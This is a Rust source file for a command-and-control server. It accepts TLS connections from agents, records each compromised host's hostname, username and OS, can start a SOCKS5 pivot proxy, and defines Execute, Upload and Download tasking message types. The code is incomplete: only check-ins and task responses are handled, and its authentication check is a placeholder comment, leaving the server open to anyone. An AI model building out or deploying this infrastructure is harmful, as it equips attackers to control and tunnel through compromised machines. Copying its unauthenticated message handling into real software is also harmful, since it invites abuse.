use crate::config::C2Config;
use crate::certbot::CertBot;
use crate::socks5::MerinoManager;
use anyhow::{Context, Result};
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::sync::Arc;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::{TcpListener, TcpStream};
use tokio::sync::RwLock;
use tokio_rustls::TlsAcceptor;
use tracing::{error, info, warn};
use uuid::Uuid;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Agent {
    pub id: Uuid,
    pub hostname: String,
    pub username: String,
    pub os: String,
    pub connected_at: String,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct C2Message {
    pub agent_id: Uuid,
    pub message_type: MessageType,
    pub payload: String,
}

#[derive(Debug, Serialize, Deserialize)]
pub enum MessageType {
    Checkin,
    TaskRequest,
    TaskResponse,
    Execute,
    Upload,
    Download,
}

pub struct C2Server {
    config: C2Config,
    agents: Arc<RwLock<HashMap<Uuid, Agent>>>,
    merino: Option<MerinoManager>,
}

impl C2Server {
    pub fn new(config: C2Config) -> Self {
        let merino = if config.socks5.enabled {
            Some(MerinoManager::new(config.socks5.clone()))
        } else {
            None
        };

        Self {
            config,
            agents: Arc::new(RwLock::new(HashMap::new())),
            merino,
        }
    }

    pub async fn start(&mut self) -> Result<()> {
        info!("Starting C2 Server...");

        // Start SOCKS5 proxy if enabled
        if let Some(merino) = &mut self.merino {
            merino.start()?;
        }

        // Setup TLS if enabled
        let acceptor = if self.config.tls.enabled {
            info!("Setting up TLS...");
            let certbot = CertBot::new("certs")?;
            
            let domain = self.config.tls.domain.as_ref()
                .ok_or_else(|| anyhow::anyhow!("TLS domain not specified"))?;

            let _cert_info = certbot.ensure_certificate(
                domain,
                &self.config.tls.cert_path,
                &self.config.tls.key_path,
            )?;

            let tls_config = CertBot::load_tls_config(
                &self.config.tls.cert_path,
                &self.config.tls.key_path,
            )?;

            Some(TlsAcceptor::from(Arc::new(tls_config)))
        } else {
            None
        };

        // Bind server
        let bind_addr = format!("{}:{}", self.config.server.bind_address, self.config.server.port);
        let listener = TcpListener::bind(&bind_addr)
            .await
            .context("Failed to bind C2 server")?;

        info!("C2 Server listening on {}", bind_addr);

        // Accept connections
        loop {
            let (stream, addr) = listener.accept().await?;
            info!("New connection from: {}", addr);

            let agents = self.agents.clone();
            let config = self.config.clone();
            let acceptor = acceptor.clone();

            tokio::spawn(async move {
                if let Err(e) = Self::handle_client(stream, agents, config, acceptor).await {
                    error!("Error handling client: {}", e);
                }
            });
        }
    }

    async fn handle_client(
        stream: TcpStream,
        agents: Arc<RwLock<HashMap<Uuid, Agent>>>,
        config: C2Config,
        acceptor: Option<TlsAcceptor>,
    ) -> Result<()> {
        // Wrap in TLS if enabled
        if let Some(acceptor) = acceptor {
            let tls_stream = acceptor.accept(stream).await?;
            Self::process_client(tls_stream, agents, config).await
        } else {
            Self::process_client(stream, agents, config).await
        }
    }

    async fn process_client<S>(
        mut stream: S,
        agents: Arc<RwLock<HashMap<Uuid, Agent>>>,
        config: C2Config,
    ) -> Result<()>
    where
        S: AsyncReadExt + AsyncWriteExt + Unpin,
    {
        let mut buffer = vec![0u8; 4096];
        let n = stream.read(&mut buffer).await?;

        if n == 0 {
            return Ok(());
        }

        let data = &buffer[..n];
        let message: C2Message = serde_json::from_slice(data)?;

        // Verify auth token
        // In real implementation, verify token here

        match message.message_type {
            MessageType::Checkin => {
                info!("Agent checkin: {:?}", message.agent_id);
                
                let agent: Agent = serde_json::from_str(&message.payload)?;
                agents.write().await.insert(message.agent_id, agent);

                let response = serde_json::to_vec(&C2Message {
                    agent_id: message.agent_id,
                    message_type: MessageType::TaskRequest,
                    payload: "OK".to_string(),
                })?;

                stream.write_all(&response).await?;
            }
            MessageType::TaskResponse => {
                info!("Task response from {}: {}", message.agent_id, message.payload);
                
                let response = serde_json::to_vec(&C2Message {
                    agent_id: message.agent_id,
                    message_type: MessageType::TaskRequest,
                    payload: "ACK".to_string(),
                })?;

                stream.write_all(&response).await?;
            }
            _ => {
                warn!("Unhandled message type: {:?}", message.message_type);
            }
        }

        Ok(())
    }

    pub async fn list_agents(&self) -> Vec<Agent> {
        self.agents.read().await.values().cloned().collect()
    }
}
